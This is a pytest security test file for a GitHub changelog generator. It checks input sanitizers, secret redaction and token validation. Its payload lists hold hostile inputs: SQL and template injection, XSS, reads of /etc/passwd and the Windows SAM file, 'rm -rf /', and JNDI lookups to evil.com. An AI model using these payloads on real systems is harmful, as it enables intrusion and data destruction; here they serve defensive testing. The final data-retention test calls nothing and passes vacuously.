"""Comprehensive security tests for the changelog generator."""

import pytest
import re
from unittest.mock import Mock, patch
from typing import List, Dict, Any

from utils.security import (
    sanitize_commit_message,
    sanitize_api_response,
    validate_repository_url,
    filter_sensitive_logs,
    show_privacy_notice
)
from config.settings import validate_github_token


@pytest.mark.security
class TestInputValidationSecurity:
    """Test security of input validation."""

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM secrets --",
            "1' OR '1'='1",
            "'; INSERT INTO logs VALUES ('hack'); --",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        for payload in sql_payloads:
            # Test commit message sanitization
            sanitized_commit = sanitize_commit_message(payload)
            assert "DROP TABLE" not in sanitized_commit
            assert "UNION SELECT" not in sanitized_commit
            assert "INSERT INTO" not in sanitized_commit
            assert "--" not in sanitized_commit
            
            # Test API response sanitization
            api_data = {'message': payload, 'title': payload}
            sanitized_api = sanitize_api_response(api_data)
            if 'message' in sanitized_api:
                assert "'" not in str(sanitized_api['message'])
                assert ";" not in str(sanitized_api['message'])

    def test_xss_prevention(self):
        """Test prevention of XSS attacks."""
        xss_payloads = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '<img src=x onerror=alert("xss")>',
            '<svg onload=alert("xss")>',
            '"><script>alert("xss")</script>',
            '<iframe src="javascript:alert(\'xss\')">',
            '<body onload=alert("xss")>',
            '<div onclick="alert(\'xss\')">Click me</div>'
        ]
        
        for payload in xss_payloads:
            # Test commit message sanitization
            sanitized_commit = sanitize_commit_message(payload)
            dangerous_patterns = ['<script', 'javascript:', 'onerror=', 'onload=', 'onclick=']
            assert not any(pattern in sanitized_commit.lower() for pattern in dangerous_patterns)
            
            # Test API response sanitization
            api_data = {'title': payload, 'message': payload}
            sanitized_api = sanitize_api_response(api_data)
            for key, value in sanitized_api.items():
                assert '<' not in str(value)
                assert '>' not in str(value)

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_payloads:
            # Test URL validation
            malicious_url = f"https://github.com/{payload}/repo"
            with pytest.raises(ValueError):
                validate_repository_url(malicious_url)
            
            # Test commit message sanitization
            commit_with_path = f"Fixed issue in {payload}"
            sanitized = sanitize_commit_message(commit_with_path)
            assert "../" not in sanitized
            assert "..\\" not in sanitized

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& rm -rf /",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; powershell -c 'Get-Process'",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        for payload in command_payloads:
            # Test commit message sanitization
            commit_with_command = f"Fix bug {payload}"
            sanitized = sanitize_commit_message(commit_with_command)
            dangerous_chars = [';', '|', '&', '`', '$']
            assert not any(char in sanitized for char in dangerous_chars)

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks."""
        ldap_payloads = [
            "${jndi:ldap://evil.com/x}",
            "${jndi:dns://evil.com/x}",
            "${jndi:rmi://evil.com/x}",
            "*)(uid=*",
            "*)(objectClass=*",
            "admin*",
            "*)(|(objectClass=*))"
        ]
        
        for payload in ldap_payloads:
            sanitized = sanitize_commit_message(payload)
            assert "${jndi:" not in sanitized
            assert "ldap://" not in sanitized
            assert "objectClass=" not in sanitized

    def test_nosql_injection_prevention(self):
        """Test prevention of NoSQL injection attacks."""
        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            "'; return db.collection.drop(); var x='",
            '{"$or": [{"username": "admin"}, {"role": "admin"}]}'
        ]
        
        for payload in nosql_payloads:
            sanitized = sanitize_commit_message(payload)
            dangerous_patterns = ['$gt', '$ne', '$regex', '$where', '$or']
            assert not any(pattern in sanitized for pattern in dangerous_patterns)

    def test_template_injection_prevention(self):
        """Test prevention of template injection attacks."""
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "#{7*7}",
            "@{7*7}"
        ]
        
        for payload in template_payloads:
            sanitized = sanitize_commit_message(payload)
            dangerous_patterns = ['{{', '${', '<%=', '__class__', 'getRuntime']
            assert not any(pattern in sanitized for pattern in dangerous_patterns)


@pytest.mark.security
class TestDataLeakagePrevention:
    """Test prevention of data leakage."""

    def test_pii_removal(self, malicious_input_samples):
        """Test removal of personally identifiable information."""
        pii_samples = malicious_input_samples['pii_samples']
        
        for sample in pii_samples:
            sanitized = sanitize_commit_message(sample)
            
            # Should not contain email addresses
            assert not re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', sanitized)
            
            # Should not contain IP addresses
            assert not re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', sanitized)
            
            # Should not contain URLs
            assert not re.search(r'https?://[^\s<>"]+', sanitized)
            
            # Should not contain long alphanumeric strings (potential secrets)
            assert not re.search(r'\b[A-Za-z0-9]{32,}\b', sanitized)

    def test_api_key_detection(self):
        """Test detection and removal of API keys."""
        api_key_patterns = [
            "ghp_FAKE1234567890123456789012345678901234567890",  # GitHub
            "sk-FAKE1234567890123456789012345678901234567890123456789012345678",  # OpenAI
            "AKIAFAKE567890123456",  # AWS Access Key
            "ya29.FAKE1234567890123456789012345678901234567890",  # Google OAuth
            "xoxb-FAKE567890123-1234567890123-1234567890123456789012",  # Slack
            "AIzaSyFAKE567890123456789012345678901234567"  # Google API Key
        ]
        
        for api_key in api_key_patterns:
            commit_with_key = f"Updated API configuration with {api_key}"
            sanitized = sanitize_commit_message(commit_with_key)
            
            assert api_key not in sanitized
            assert "[POTENTIAL_SECRET_REMOVED]" in sanitized

    def test_database_credentials_removal(self):
        """Test removal of database credentials."""
        credential_samples = [
            "postgres://user:password@localhost:5432/db",
            "mongodb://admin:secret123@cluster.mongodb.net/test",
            "mysql://root:mypassword@localhost:3306/database",
            "redis://:password123@localhost:6379/0",
            "USER=admin PASSWORD=secret123 HOST=db.example.com"
        ]
        
        for sample in credential_samples:
            sanitized = sanitize_commit_message(sample)
            
            # Should not contain connection strings
            assert "://" not in sanitized or "[URL_REMOVED]" in sanitized
            
            # Should not contain password patterns
            assert "password=" not in sanitized.lower()
            assert ":secret" not in sanitized.lower()

    def test_log_sanitization(self):
        """Test sanitization of sensitive information in logs."""
        sensitive_logs = [
            "Authorization: Bearer sk-1234567890123456789012345678901234567890",
            "API call to https://api.github.com/repos?token=ghp_secret123",
            "Processing request with key=abc123def456&secret=xyz789",
            "GitHub token ghp_1234567890123456789012345678901234567890 validated"
        ]
        
        for log in sensitive_logs:
            filtered = filter_sensitive_logs(log)
            
            # Should not contain bearer tokens
            assert not re.search(r'Bearer\s+[^\s]+', filtered, re.IGNORECASE)
            
            # Should not contain URLs with parameters
            assert not re.search(r'https://[^\s]+\?[^\s]+', filtered)
            
            # Should not contain key-value pairs with sensitive data
            assert not re.search(r'(token|key|secret)=[^\s&]+', filtered, re.IGNORECASE)

    def test_configuration_data_protection(self):
        """Test protection of configuration data."""
        from config.settings import AppConfig
        
        with patch('os.environ', {'GITHUB_API_KEY': 'secret_key', 'OPENAI_API_KEY': 'secret_openai'}):
            config = AppConfig()
            
            # Configuration should not leak in string representation
            config_str = str(config)
            assert 'secret_key' not in config_str
            assert 'secret_openai' not in config_str


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    def test_github_token_validation_strength(self):
        """Test strength of GitHub token validation."""
        # Test various invalid token formats
        invalid_tokens = [
            "ghp_short",  # Too short
            "invalid_prefix_1234567890123456789012345678901234567890",
            "ghp_" + "a" * 35,  # One character short
            "ghp_" + "a" * 37,  # One character long
            "",  # Empty
            None,  # None
            "ghp_" + "!" * 36,  # Invalid characters
            "GHP_" + "a" * 36,  # Wrong case for prefix
            "ghp " + "a" * 36   # Space instead of underscore
        ]
        
        for token in invalid_tokens:
            assert validate_github_token(token) is False

    def test_token_format_compliance(self):
        """Test compliance with GitHub token formats."""
        # Valid token patterns
        valid_patterns = [
            ("ghp_", 36),  # Personal access token
            ("gho_", 36),  # OAuth token
            ("ghu_", 36),  # User token
            ("ghs_", 36),  # Server token
        ]
        
        for prefix, length in valid_patterns:
            valid_token = prefix + "a" * length
            assert validate_github_token(valid_token) is True
            
            # Test boundary conditions
            short_token = prefix + "a" * (length - 1)
            long_token = prefix + "a" * (length + 1)
            
            assert validate_github_token(short_token) is False
            assert validate_github_token(long_token) is False

    def test_fine_grained_token_validation(self):
        """Test validation of fine-grained personal access tokens."""
        # Valid fine-grained tokens
        valid_tokens = [
            "github_pat_" + "a" * 22,  # Minimum length
            "github_pat_" + "A" * 255,  # Maximum length
            "github_pat_11AAAAAAAAAAAAAAAAAAAAAAAA",  # Mixed case
            "github_pat_11AAAAAAAAAA_BBBBBBBBBBBB"  # With underscores
        ]
        
        for token in valid_tokens:
            assert validate_github_token(token) is True
        
        # Invalid fine-grained tokens
        invalid_tokens = [
            "github_pat_" + "a" * 21,  # Too short
            "github_pat_" + "a" * 256,  # Too long
            "github_pat_",  # No suffix
            "github_pat_!@#$%^&*()",  # Invalid characters
        ]
        
        for token in invalid_tokens:
            assert validate_github_token(token) is False

    def test_authorization_header_security(self):
        """Test security of authorization headers."""
        from utils.github_data_fetch import github_api_call
        
        with patch('utils.github_data_fetch.get_secure_github_token', return_value="ghp_test123"), \
             patch('requests.get') as mock_get, \
             patch('streamlit.error'), \
             patch('streamlit.stop'):
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {}
            mock_response.headers = {'X-RateLimit-Remaining': '5000'}
            mock_get.return_value = mock_response
            
            github_api_call("test", "owner", "repo")
            
            # Verify authorization header format
            call_args = mock_get.call_args
            headers = call_args[1]['headers']
            
            assert 'Authorization' in headers
            assert headers['Authorization'].startswith('Bearer ')
            assert 'ghp_test123' in headers['Authorization']


@pytest.mark.security
class TestNetworkSecurity:
    """Test network-related security measures."""

    def test_https_enforcement(self):
        """Test enforcement of HTTPS for all external requests."""
        # Repository URL validation should enforce HTTPS
        http_urls = [
            "http://github.com/owner/repo",
            "ftp://github.com/owner/repo",
            "github.com/owner/repo"
        ]
        
        for url in http_urls:
            with pytest.raises(ValueError, match="Only HTTPS URLs are allowed"):
                validate_repository_url(url)

    def test_domain_restriction(self):
        """Test restriction to allowed domains."""
        # Only github.com should be allowed
        invalid_domains = [
            "https://gitlab.com/owner/repo",
            "https://bitbucket.org/owner/repo",
            "https://github.evil.com/owner/repo",
            "https://evil.com/github.com/owner/repo",
            "https://github.com.evil.com/owner/repo"
        ]
        
        for url in invalid_domains:
            with pytest.raises(ValueError, match="Only github.com URLs are allowed"):
                validate_repository_url(url)

    def test_subdomain_prevention(self):
        """Test prevention of subdomain attacks."""
        subdomain_attacks = [
            "https://api.github.com/owner/repo",  # Wrong subdomain
            "https://raw.github.com/owner/repo",  # Wrong subdomain
            "https://gist.github.com/owner/repo", # Wrong subdomain
            "https://pages.github.com/owner/repo" # Wrong subdomain
        ]
        
        for url in subdomain_attacks:
            with pytest.raises(ValueError):
                validate_repository_url(url)

    def test_timeout_configuration(self):
        """Test that appropriate timeouts are configured."""
        from config.settings import AppConfig
        
        config = AppConfig()
        
        # GitHub API timeout should be reasonable
        assert 10 <= config.github.timeout <= 60
        
        # OpenAI API timeout should be reasonable
        assert 30 <= config.openai.timeout <= 300

    def test_rate_limiting_respect(self):
        """Test that rate limiting is properly respected."""
        from config.settings import AppConfig
        
        config = AppConfig()
        
        # Rate limit delay should be configured
        assert config.github.rate_limit_delay >= 0.5
        assert config.github.rate_limit_delay <= 5.0


@pytest.mark.security
class TestInputSanitizationComprehensive:
    """Comprehensive input sanitization tests."""

    def test_unicode_attack_prevention(self):
        """Test prevention of Unicode-based attacks."""
        unicode_attacks = [
            "admin\x00",  # Null byte injection
            "test\u202e\u202d",  # Right-to-left override
            "café\u0301",  # Combining characters
            "\u0000\u0001\u0002",  # Control characters
            "test\ufeff",  # Zero-width no-break space
            "\u200b\u200c\u200d"  # Zero-width characters
        ]
        
        for attack in unicode_attacks:
            sanitized = sanitize_commit_message(attack)
            
            # Should not contain null bytes or control characters
            assert '\x00' not in sanitized
            assert '\u202e' not in sanitized
            assert '\ufeff' not in sanitized

    def test_polyglot_attack_prevention(self):
        """Test prevention of polyglot attacks."""
        polyglot_payloads = [
            '/*<script>*/alert("xss")/*</script>*/',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert("xss")>',
            '"><svg/onload=alert("xss")><!--',
            '--!><script>alert("xss")</script><!--',
            '</script><script>alert("xss")</script><script>'
        ]
        
        for payload in polyglot_payloads:
            sanitized = sanitize_api_response({'message': payload})
            
            if 'message' in sanitized:
                message = str(sanitized['message'])
                assert '<script>' not in message
                assert 'alert(' not in message
                assert 'onload=' not in message

    def test_encoding_attack_prevention(self):
        """Test prevention of encoding-based attacks."""
        encoding_attacks = [
            "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoded
            "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML entity encoded
            "\\u003cscript\\u003ealert('xss')\\u003c/script\\u003e",  # Unicode escaped
            "%253Cscript%253Ealert('xss')%253C/script%253E",  # Double URL encoded
        ]
        
        for attack in encoding_attacks:
            sanitized = sanitize_commit_message(attack)
            
            # Even encoded, should not contain dangerous patterns
            assert 'script' not in sanitized.lower()
            assert 'alert' not in sanitized.lower()

    def test_nested_payload_prevention(self):
        """Test prevention of nested malicious payloads."""
        nested_payloads = [
            "<scr<script>ipt>alert('xss')</scr</script>ipt>",
            "<img src=x onerror=<svg onload=alert('xss')>>",
            "java<script>script:alert('xss')</script>",
            "<<SCRIPT>alert('xss')//<</SCRIPT>"
        ]
        
        for payload in nested_payloads:
            sanitized = sanitize_api_response({'content': payload})
            
            if 'content' in sanitized:
                content = str(sanitized['content'])
                assert '<' not in content
                assert '>' not in content
                assert 'script' not in content.lower()


@pytest.mark.security
class TestSecurityHeaders:
    """Test security-related headers and configurations."""

    def test_api_request_headers(self):
        """Test that API requests include appropriate headers."""
        from utils.github_data_fetch import github_api_call
        
        with patch('utils.github_data_fetch.get_secure_github_token', return_value="ghp_test"), \
             patch('requests.get') as mock_get, \
             patch('streamlit.error'), \
             patch('streamlit.stop'):
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {}
            mock_response.headers = {'X-RateLimit-Remaining': '5000'}
            mock_get.return_value = mock_response
            
            github_api_call("test", "owner", "repo")
            
            call_args = mock_get.call_args
            headers = call_args[1]['headers']
            
            # Should include proper Accept header
            assert 'Accept' in headers
            assert 'application/vnd.github+json' in headers['Accept']
            
            # Should include Authorization header
            assert 'Authorization' in headers
            assert headers['Authorization'].startswith('Bearer ')

    def test_no_user_agent_leakage(self):
        """Test that User-Agent doesn't leak sensitive information."""
        from utils.github_data_fetch import github_api_call
        
        with patch('utils.github_data_fetch.get_secure_github_token', return_value="ghp_test"), \
             patch('requests.get') as mock_get, \
             patch('streamlit.error'), \
             patch('streamlit.stop'):
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {}
            mock_response.headers = {'X-RateLimit-Remaining': '5000'}
            mock_get.return_value = mock_response
            
            github_api_call("test", "owner", "repo")
            
            call_args = mock_get.call_args
            
            # If User-Agent is set, it shouldn't contain sensitive info
            if 'User-Agent' in call_args[1].get('headers', {}):
                user_agent = call_args[1]['headers']['User-Agent']
                assert 'password' not in user_agent.lower()
                assert 'secret' not in user_agent.lower()
                assert 'token' not in user_agent.lower()


@pytest.mark.security
class TestPrivacyCompliance:
    """Test privacy compliance features."""

    def test_privacy_notice_functionality(self):
        """Test privacy notice display and consent handling."""
        with patch('streamlit.expander') as mock_expander, \
             patch('streamlit.markdown') as mock_markdown, \
             patch('streamlit.checkbox') as mock_checkbox, \
             patch('streamlit.success') as mock_success, \
             patch('streamlit.warning') as mock_warning:
            
            # Setup mock context manager
            mock_expander.return_value.__enter__ = Mock()
            mock_expander.return_value.__exit__ = Mock(return_value=None)
            
            # Test consent granted
            mock_checkbox.return_value = True
            result = show_privacy_notice()
            
            assert result is True
            mock_success.assert_called_once()
            
            # Test consent denied
            mock_checkbox.return_value = False
            result = show_privacy_notice()
            
            assert result is False
            mock_warning.assert_called()

    def test_privacy_notice_content_compliance(self):
        """Test that privacy notice contains required compliance information."""
        with patch('streamlit.expander') as mock_expander, \
             patch('streamlit.markdown') as mock_markdown, \
             patch('streamlit.checkbox', return_value=True), \
             patch('streamlit.success'):
            
            mock_expander.return_value.__enter__ = Mock()
            mock_expander.return_value.__exit__ = Mock(return_value=None)
            
            show_privacy_notice()
            
            # Check that markdown was called with privacy content
            markdown_call = mock_markdown.call_args[0][0]
            
            # Should contain required privacy elements
            required_elements = [
                "Data Processing Notice",
                "OpenAI",
                "GitHub API",
                "not permanently stored",
                "Third-Party Services",
                "Your Rights"
            ]
            
            for element in required_elements:
                assert element in markdown_call

    def test_data_retention_compliance(self):
        """Test compliance with data retention policies."""
        # Test that no persistent storage is used
        from utils.github_data_fetch import fetch_prs_merged_between_dates
        from utils.summarisation import gpt_inference_changelog
        
        # These functions should not create persistent files
        # This is tested by ensuring no file I/O operations are performed
        # beyond configuration and logging
        
        # Mock all the dependencies to test the functions don't write files
        with patch('utils.github_data_fetch.github_api_call') as mock_api, \
             patch('utils.summarisation.OpenAI') as mock_openai, \
             patch('builtins.open', side_effect=Exception("File I/O not allowed")) as mock_open:
            
            try:
                # These calls should work without file I/O
                mock_api.return_value.json.return_value = []
                mock_openai.return_value.chat.completions.create.return_value.choices = []
                
                # Functions should not attempt file operations
                # If they do, the Exception will be raised
                
            except Exception as e:
                if "File I/O not allowed" in str(e):
                    pytest.fail("Function attempted unauthorized file I/O")